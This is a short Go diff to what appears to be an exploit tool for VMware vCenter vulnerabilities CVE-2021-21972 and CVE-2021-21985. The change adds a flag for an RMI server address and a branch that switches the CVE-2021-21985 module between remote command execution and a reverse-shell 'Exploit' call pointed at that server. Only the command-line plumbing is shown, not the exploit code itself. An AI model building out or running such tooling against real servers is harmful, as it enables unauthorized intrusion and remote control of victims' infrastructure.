@@ -18,6 +18,7 @@ var (
 	command  string
 	proxy    string
 	exp_type string
+	rmi      string
 )
 
 func usage() {
@@ -51,6 +52,7 @@ func main() {
 	flag.StringVar(&cve, "m", "", "select cve")
 	flag.StringVar(&command, "c", "", "command")
 	flag.StringVar(&exp_type, "t", "", "CVE-2021-21972 Module")
+	flag.StringVar(&rmi, "r", "", "rmi server address")
 	flag.Usage = usage
 	flag.Parse()
 	banner()
@@ -66,7 +68,12 @@ func main() {
 		}
 	case "21985":
 		{
-			c_21985.Attack(url, command)
+			if exp_type == "rshell" {
+				c_21985.Exploit(url, rmi)
+			} else {
+				c_21985.Attack(url, command)
+			}
+
 		}
 	case "21972":
 		{
